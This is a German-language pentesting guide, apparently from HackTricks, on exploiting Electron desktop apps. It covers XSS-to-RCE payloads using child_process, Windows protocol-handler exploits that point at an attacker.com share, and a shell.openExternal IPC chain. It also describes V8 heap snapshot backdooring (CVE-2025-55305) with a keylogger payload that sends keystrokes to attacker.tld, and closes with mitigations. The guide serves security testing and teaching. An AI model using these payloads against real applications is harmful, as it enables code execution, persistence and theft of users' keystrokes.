# Electron Desktop Apps

{{#include ../../../banners/hacktricks-training.md}}

## Einführung

Electron kombiniert ein lokales Backend (mit **NodeJS**) und ein Frontend (**Chromium**), obwohl es einige Sicherheitsmechanismen moderner Browser nicht bietet.

In der Regel findet man den Code einer Electron-App innerhalb einer `.asar`-Anwendung; um den Code zu erhalten, muss man diese extrahieren:
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
Im Quellcode einer Electron-App finden Sie in der Datei `packet.json` die Angabe der `main.js`, in der security configs gesetzt sind.
```json
{
"name": "standard-notes",
"main": "./app/index.js",
```
Electron hat 2 Prozessarten:

- Main Process (hat vollständigen Zugriff auf NodeJS)
- Renderer Process (sollte aus Sicherheitsgründen eingeschränkten Zugriff auf NodeJS haben)

![](<../../../images/image (182).png>)

Ein **renderer process** ist ein Browserfenster, das eine Datei lädt:
```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```
Einstellungen des **renderer process** können im **main process** innerhalb der main.js-Datei **konfiguriert** werden. Einige der Konfigurationen können verhindern, dass die Electron-Anwendung RCE oder andere Verwundbarkeiten erhält, wenn die **Einstellungen korrekt konfiguriert** sind.

Die Electron-Anwendung **kann auf das Gerät zugreifen** via Node apis, obwohl sie so konfiguriert werden kann, dass dies verhindert wird:

- **`nodeIntegration`** - is `off` by default. If on, allows to access node features from the renderer process.
- **`contextIsolation`** - is `on` by default. If off, main and renderer processes aren't isolated.
- **`preload`** - empty by default.
- [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - is off by default. It will restrict the actions NodeJS can perform.
- Node Integration in Workers
- **`nodeIntegrationInSubframes`**- is `off` by default.
- If **`nodeIntegration`** is **enabled**, this would allow the use of **Node.js APIs** in web pages that are **loaded in iframes** within an Electron application.
- If **`nodeIntegration`** is **disabled**, then preloads will load in the iframe

Example of configuration:
```javascript
const mainWindowOptions = {
title: "Discord",
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: "EnumerateDevices,AudioOutputDevices",
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true,
},
}
```
Einige **RCE payloads** von [here](https://7as.es/electron/nodeIntegration_rce.txt):
```html
Example Payloads (Windows):
<img
src="x"
onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
src="x"
onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('id').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('uname -a').toString());" />
```
### Netzwerkverkehr erfassen

Ändere die start-main-Konfiguration und füge die Verwendung eines Proxys wie folgt hinzu:
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## Electron Local Code Injection

Wenn Sie eine Electron App lokal ausführen können, ist es möglich, dass Sie sie dazu bringen können, beliebigen javascript-Code auszuführen. Siehe dazu:


{{#ref}}
../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

## RCE: XSS + nodeIntegration

Wenn die **nodeIntegration** auf **on** gesetzt ist, kann das JavaScript einer Webseite Node.js-Funktionen ganz einfach durch den Aufruf von `require()` verwenden. Zum Beispiel wird die calc-Anwendung unter Windows wie folgt ausgeführt:
```html
<script>
require("child_process").exec("calc")
// or
top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```
<figure><img src="../../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Das in dieser Einstellung angegebene Skript wird **vor anderen Skripten im renderer geladen**, daher hat es **unbegrenzten Zugriff auf Node APIs**:
```javascript
new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
```
Daher kann das Skript node-features in Seiten exportieren:
```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
require("child_process").exec("calc")
}
```

```html:index.html
<body>
<script>
typeof require === "undefined"
runCalc()
</script>
</body>
```
> [!NOTE] > **Wenn `contextIsolation` aktiviert ist, funktioniert das nicht**

## RCE: XSS + contextIsolation

Die _**contextIsolation**_ führt getrennte Kontexte zwischen den Skripten der Webseite und dem internen JavaScript-Code von Electron ein, sodass die JavaScript-Ausführung des einen Codes den anderen nicht beeinflusst. Dies ist eine notwendige Funktion, um die Möglichkeit von RCE auszuschließen.

Wenn die Kontexte nicht isoliert sind, kann ein Angreifer:

1. Führe **beliebiges JavaScript im renderer** aus (XSS oder Navigation zu externen Seiten)
2. **Überschreibe die eingebaute Methode**, die im preload- oder im internen Electron-Code verwendet wird, um Kontrolle zu erlangen
3. **Veranlasse** die Ausführung der **überschriebenen Funktion**
4. RCE?

Es gibt 2 Stellen, an denen eingebaute Methoden überschrieben werden können: Im preload-Code oder im internen Electron-Code:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Klick-Ereignis umgehen

Wenn beim Klicken eines Links Einschränkungen gelten, kannst du diese möglicherweise umgehen, indem du **einen Mittelklick** statt eines normalen Linksklicks verwendest.
```javascript
window.addEventListener('click', (e) => {
```
## RCE via shell.openExternal

Für weitere Informationen zu diesen Beispielen siehe [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) und [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)

Beim Bereitstellen einer Electron-Desktop-Anwendung ist es entscheidend, die richtigen Einstellungen für `nodeIntegration` und `contextIsolation` vorzunehmen. Es ist etabliert, dass **client-side remote code execution (RCE)**, die auf preload scripts oder Electron's native code vom main process abzielt, mit diesen Einstellungen effektiv verhindert wird.

Wenn ein Benutzer mit Links interagiert oder neue Fenster öffnet, werden bestimmte Event-Listener ausgelöst, die für die Sicherheit und Funktionalität der Anwendung entscheidend sind:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
Diese Listener werden **von der Desktop-Anwendung überschrieben**, um ihre eigene **Geschäftslogik** zu implementieren. Die Anwendung bewertet, ob ein aufgerufener Link intern oder in einem externen Webbrowser geöffnet werden soll. Diese Entscheidung wird typischerweise durch eine Funktion, `openInternally`, getroffen. Gibt diese Funktion `false` zurück, zeigt das an, dass der Link extern geöffnet werden soll, wobei die Funktion `shell.openExternal` verwendet wird.

**Here is a simplified pseudocode:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../../images/image (963).png>)

Electron JS Sicherheits-Best-Practices raten davon ab, nicht vertrauenswürdige Inhalte mit der Funktion `openExternal` zu akzeptieren, da dies zu RCE über verschiedene Protokolle führen kann. Betriebssysteme unterstützen unterschiedliche Protokolle, die RCE auslösen könnten. Für ausführliche Beispiele und weiterführende Erklärungen zu diesem Thema kann auf [this resource](https://positive.security/blog/url-open-rce#windows-10-19042) verwiesen werden; sie enthält Windows-Protokoll-Beispiele, mit denen diese Schwachstelle ausgenutzt werden kann.

In macos kann die Funktion `openExternal` ausgenutzt werden, um beliebige Befehle auszuführen, z. B. `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Examples of Windows protocol exploits include:**
```html
<script>
window.open(
"ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
)
</script>

<script>
window.open(
"search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
)
</script>

<script>
window.open(
"ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
)
</script>
```
## RCE: webviewTag + anfällige preload-IPC + shell.openExternal

Diese Schwachstelle findet sich in **[this report](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**.

Die **webviewTag** ist eine **veraltete Funktion**, die die Nutzung von **NodeJS** im **renderer process** erlaubt. Sie sollte deaktiviert werden, da sie das Laden eines Skripts im preload context ermöglicht, wie:
```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```
Daher konnte ein Angreifer, der es schafft, eine beliebige Seite zu laden, dieses Tag verwenden, um ein beliebiges **preload script** zu laden.

Dieses **preload script** wurde dann missbraucht, um einen **verwundbaren IPC-Dienst (`skype-new-window`)** aufzurufen, der **`shell.openExternal`** aufrief, um RCE zu erlangen:
```javascript
(async() => {
const { ipcRenderer } = require("electron");
await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
setTimeout(async () => {
const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
}, 5000);
})();
```
## Interne Dateien lesen: XSS + contextIsolation

**Das Deaktivieren von `contextIsolation` ermöglicht die Verwendung von `<webview>`-Tags**, ähnlich wie `<iframe>`, um lokale Dateien zu lesen und zu exfiltrieren. Ein Beispiel zeigt, wie diese Schwachstelle ausgenutzt werden kann, um den Inhalt interner Dateien zu lesen:

![](<../../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Weiter wird eine andere Methode zum **Lesen einer internen Datei** vorgestellt, die eine kritische lokale Datei-Lese-Schwachstelle in einer Electron desktop app hervorhebt. Dabei wird ein Script injiziert, um die Anwendung auszunutzen und Daten zu exfiltrieren:
```html
<br /><br /><br /><br />
<h1>
pwn<br />
<iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
function j() {
alert(
"pwned contents of /etc/hosts :\n\n " +
frames[0].document.body.innerText
)
}
</script>
</h1>
```
## **RCE: XSS + Old Chromium**

Wenn die von der Anwendung verwendete **chromium** **old** ist und es dafür **known** **vulnerabilities** gibt, könnte es möglich sein, **exploit it and obtain RCE through a XSS**.\
Du findest ein Beispiel in diesem **writeup**: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **XSS Phishing via Internal URL regex bypass**

Angenommen, du hast eine **XSS** gefunden, aber **cannot trigger RCE or steal internal files**, könntest du versuchen, sie zu nutzen, um **steal credentials via phishing**.

Zuerst musst du wissen, was passiert, wenn du versuchst, eine neue URL zu öffnen, indem du den JS-Code im front-end überprüfst:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
Der Aufruf von **`openInternally`** entscheidet, ob der **link** im **Desktop-Fenster** **geöffnet** wird, weil er zur Plattform gehört, **oder** ob er im **browser as a 3rd party resource** geöffnet wird.

Falls der von der Funktion verwendete **regex** **anfällig für bypasses** ist (zum Beispiel, indem die Punkte von Subdomains **nicht escaped** werden), könnte ein Angreifer die **XSS** ausnutzen, um **ein neues Fenster zu öffnen, das** in der Infrastruktur des Angreifers liegt und den Benutzer **nach credentials fragt**:
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## `file://` Protokoll

As mentioned in [the docs](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols) pages running on **`file://`** have unilateral access to every file on your machine meaning that **XSS issues can be used to load arbitrary files** from the users machine. Using a **benutzerdefiniertes Protokoll** prevents issues like this as you can limit the protocol to only serving a specific set of files.

## Remote-Modul

The Electron Remote module allows **renderer processes to access main process APIs**, facilitating communication within an Electron application. However, enabling this module introduces significant security risks. It expands the application's attack surface, making it more susceptible to vulnerabilities such as cross-site scripting (XSS) attacks.

> [!TIP]
> Although the **remote** module exposes some APIs from main to renderer processes, it's not straight forward to get RCE just only abusing the components. However, the components might expose sensitive information.

> [!WARNING]
> Viele Apps, die das **remote**-Modul noch verwenden, tun dies so, dass es **erfordert, dass NodeIntegration aktiviert ist** im renderer-Prozess, was ein **enormes Sicherheitsrisiko** darstellt.

Since Electron 14 the `remote` module of Electron might be enabled in several steops cause due to security and performance reasons it's **empfohlen, es nicht zu verwenden**.

To enable it, it'd first needed to **im Hauptprozess aktivieren**:
```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
mainWindow = new BrowserWindow({
[...]
})
remoteMain.enable(mainWindow.webContents)
```
Dann kann der Renderer-Prozess Objekte aus dem Modul wie folgt importieren:
```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```
Der **[blog post](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** beschreibt einige interessante **Funktionen**, die vom Objekt **`app`** des remote-Moduls bereitgestellt werden:

- **`app.relaunch([options])`**
- **Startet neu** die Anwendung, indem die aktuelle Instanz **beendet** und eine neue **gestartet** wird. Nützlich für **App-Updates** oder erhebliche **Zustandsänderungen**.
- **`app.setAppLogsPath([path])`**
- **Definiert** oder **erstellt** ein Verzeichnis zum Speichern von **App-Logs**. Die Logs können mit **`app.getPath()`** oder **`app.setPath(pathName, newPath)`** **abgerufen** oder **verändert** werden.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**
- **Registriert** die aktuelle ausführbare Datei als **Standard-Handler** für ein angegebenes **Protokoll**. Optional können Sie einen **benutzerdefinierten Pfad** und **Argumente** angeben.
- **`app.setUserTasks(tasks)`**
- **Fügt** Aufgaben zur **Tasks-Kategorie** in der **Jump List** (unter Windows) hinzu. Jede Aufgabe kann steuern, wie die App **gestartet** wird oder welche **Argumente** übergeben werden.
- **`app.importCertificate(options, callback)`**
- **Importiert** ein **PKCS#12-Zertifikat** in den **Zertifikatsspeicher** des Systems (nur Linux). Ein **Callback** kann verwendet werden, um das Ergebnis zu verarbeiten.
- **`app.moveToApplicationsFolder([options])`**
- **Verschiebt** die Anwendung in den **Applications-Ordner** (auf macOS). Hilft, eine **standardisierte Installation** für Mac-Benutzer sicherzustellen.
- **`app.setJumpList(categories)`**
- **Legt fest** oder **entfernt** eine **benutzerdefinierte Jump List** unter **Windows**. Sie können **Kategorien** angeben, um zu organisieren, wie Aufgaben für den Benutzer angezeigt werden.
- **`app.setLoginItemSettings(settings)`**
- **Konfiguriert**, welche **ausführbaren Dateien** beim **Anmelden** zusammen mit ihren **Optionen** gestartet werden (nur macOS und Windows).

Example:
```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```
## systemPreferences module

Die **primäre API** zum Zugriff auf system preferences und zum **Auslösen von system events** in Electron. Methoden wie **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault** und **setUserDefault** sind alle **Teil dieses Moduls**.

**Beispiel:**
```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```
### **subscribeNotification / subscribeWorkspaceNotification**

* **Hört** auf **systemeigene macOS-Benachrichtigungen** mit NSDistributedNotificationCenter.
* Vor **macOS Catalina** konnte man **alle** verteilten Benachrichtigungen **sniffen**, indem man **nil** an CFNotificationCenterAddObserver übergab.
* Nach **Catalina / Big Sur** können sandboxed Apps weiterhin **viele Ereignisse** **abonnieren** (zum Beispiel **Bildschirmsperren/-entsperren**, **Volume-Mounts**, **Netzwerkaktivität**, etc.), indem sie Benachrichtigungen **nach Name** registrieren.

### **getUserDefault / setUserDefault**

* **Interagiert** mit **NSUserDefaults**, das **Anwendungs-** oder **globale** Einstellungen auf macOS speichert.

* **getUserDefault** kann **sensible Informationen** abrufen, wie zum Beispiel **zuletzt verwendete Dateipfade** oder den **geografischen Standort des Benutzers**.

* **setUserDefault** kann diese Einstellungen **ändern**, was potenziell die **Konfiguration** einer App beeinflusst.

* In **älteren Electron-Versionen** (vor v8.3.0) war nur die **Standard-Suite** von NSUserDefaults **zugänglich**.

## Shell.showItemInFolder

Diese Funktion zeigt die angegebene Datei im Dateimanager an, der die Datei **automatisch ausführen könnte**.

For more information check [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

## Content Security Policy

Electron apps should have a **Content Security Policy (CSP)** to **prevent XSS attacks**. The **CSP** is a **security standard** that helps **prevent** the **execution** of **untrusted code** in the browser.

It's usually **configured** in the **`main.js`** file or in the **`index.html`** template with the CSP inside a **meta tag**.

For more information check:


{{#ref}}
pentesting-web/content-security-policy-csp-bypass/
{{#endref}}


## **Tools**

- [**Electronegativity**](https://github.com/doyensec/electronegativity) ist ein Tool, um Fehlkonfigurationen und Sicherheits-Anti-Patterns in Electron-basierten Anwendungen zu identifizieren.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) ist ein Open-Source VS Code-Plugin für Electron-Anwendungen, das Electronegativity verwendet.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) um verwundbare Third-Party-Bibliotheken zu prüfen
- [**Electro.ng**](https://electro.ng/): kostenpflichtig

## Labs

In [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) findest du ein Lab, um verwundbare Electron-Apps auszunutzen.

Einige Befehle, die dir im Lab helfen werden:
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## Lokales backdooring via V8 heap snapshot tampering (Electron/Chromium) – CVE-2025-55305

Electron- und Chromium-basierte Apps deserialisieren beim Start einen vorgefertigten V8 heap snapshot (v8_context_snapshot.bin, und optional browser_v8_context_snapshot.bin), um jede V8 isolate (main, preload, renderer) zu initialisieren. Historisch haben Electrons integrity fuses diese Snapshots nicht als ausführbaren Inhalt behandelt, sodass sie sowohl der fuse-basierten Integritätsprüfung als auch den OS code-signing checks entgingen. Infolgedessen ermöglichte das Ersetzen des Snapshots in einer für den Benutzer beschreibbaren Installation eine unauffällige, persistente Codeausführung innerhalb der App, ohne die signierten Binaries oder ASAR zu ändern.

Kernpunkte
- Integritätslücke: EnableEmbeddedAsarIntegrityValidation und OnlyLoadAppFromAsar validieren das App-JavaScript innerhalb des ASAR, deckten jedoch V8 heap snapshots nicht ab (CVE-2025-55305). Chromium prüft Snapshots ebenfalls nicht auf Integrität.
- Angriffs-Voraussetzungen: Lokales Schreibrecht auf das Installationsverzeichnis der App. Das ist auf Systemen üblich, auf denen Electron-Apps oder Chromium-Browser unter für den Benutzer beschreibbaren Pfaden installiert sind (z. B. %AppData%\Local auf Windows; /Applications mit Einschränkungen auf macOS).
- Wirkung: Zuverlässige Ausführung von Angreifer-JavaScript in jedem isolate durch Überschreiben eines häufig verwendeten builtin (eines “gadget”), wodurch Persistenz und die Umgehung der Code-Signing-Prüfung ermöglicht werden.
- Betroffene Angriffsfläche: Electron-Apps (auch mit aktivierten fuses) und Chromium-basierte Browser, die Snapshots aus für den Benutzer beschreibbaren Speicherorten laden.

Generating a malicious snapshot without building Chromium
- Verwende das vorgefertigte electron/mksnapshot, um ein payload JS in einen Snapshot zu kompilieren und die v8_context_snapshot.bin der Anwendung zu überschreiben.

Example minimal payload (prove execution by forcing a crash)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
// Executed whenever the app calls Array.isArray
throw new Error("testing isArray gadget");
};
```
Isolate-aware payload routing (verschiedenen Code im main- vs. renderer-Prozess ausführen)
- Erkennung des main-Prozesses: Node-only globals wie process.pid, process.binding(), oder process.dlopen sind im Isolate des main-Prozesses vorhanden.
- Browser/renderer-Erkennung: Browser-only globals wie alert stehen zur Verfügung, wenn im Dokumentkontext ausgeführt wird.

Beispiel-Gadget, das einmal die Node-Fähigkeiten des main-Prozesses prüft
```js
const orig = Array.isArray;

Array.isArray = function() {
// Defer until we land in main (has Node process)
try {
if (!process || !process.pid) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

// Run once
if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
console.log('[payload] isArray hook started ...');

// Capability probing in main
console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
process.exit(0);
}
return orig(...arguments);
};
```
Renderer/Browser-Kontext Datendiebstahl PoC (z. B. Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
// Wait for a browser context
try {
if (!alert) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
setInterval(() => {
window.onkeydown = (e) => {
fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
}
}, 1000);
}
return orig(...arguments);
};
```
Operator-Workflow
1) Schreibe payload.js, das ein gängiges builtin überschreibt (z. B. Array.isArray) und optional je Isolate verzweigt.
2) Build the snapshot without Chromium sources:
- npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) Überschreibe die Snapshot-Datei(en) der Zielanwendung:
- v8_context_snapshot.bin (immer verwendet)
- browser_v8_context_snapshot.bin (falls der LoadBrowserProcessSpecificV8Snapshot fuse verwendet wird)
4) Starte die Anwendung; das Gadget wird ausgeführt, sobald das gewählte builtin verwendet wird.

Hinweise und Überlegungen
- Integritäts-/Signatur-Bypass: Snapshot-Dateien werden von Code-Signing-Prüfungen nicht wie native Ausführbare behandelt und waren (historisch) nicht durch Electron’s fuses oder Chromiums Integritätskontrollen abgedeckt.
- Persistenz: Das Ersetzen des Snapshots in einer benutzerschreibbaren Installation überlebt typischerweise App-Neustarts und sieht wie eine signierte, legitime App aus.
- Chromium-Browser: Dasselbe Manipulationskonzept gilt für Chrome/Derivate, die in benutzerschreibbaren Verzeichnissen installiert sind. Chrome hat weitere Integritätsmaßnahmen, schließt physisch-lokale Angriffe aber ausdrücklich aus seinem Bedrohungsmodell aus.

Erkennung und Gegenmaßnahmen
- Behandle Snapshots als ausführbaren Inhalt und beziehe sie in die Integritätsdurchsetzung ein (CVE-2025-55305 fix).
- Bevorzuge Installationsorte, die nur vom Admin beschreibbar sind; erfasse Basis-Hashes und überwache die Hashes für v8_context_snapshot.bin und browser_v8_context_snapshot.bin.
- Erkenne frühe Laufzeit-Überschreibungen von builtins und unerwartete Snapshot-Änderungen; alarmiere, wenn deserialisierte Snapshots nicht den erwarteten Werten entsprechen.

## **References**

- [Trail of Bits: Subverting code integrity checks to locally backdoor Signal, 1Password, Slack, and more](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [Electron fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [Electron ASAR integrity](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [V8 custom startup snapshots](https://v8.dev/blog/custom-startup-snapshots)
- [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [Loki C2](https://github.com/boku7/Loki/)
- [Chromium: Disable loading of unsigned code (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [Chrome security FAQ: physically local attacks out of scope](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically-local-attacks-in-chromes-threat-model)

- [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- More researches and write-ups about Electron security in [https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)
- [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

{{#include ../../../banners/hacktricks-training.md}}
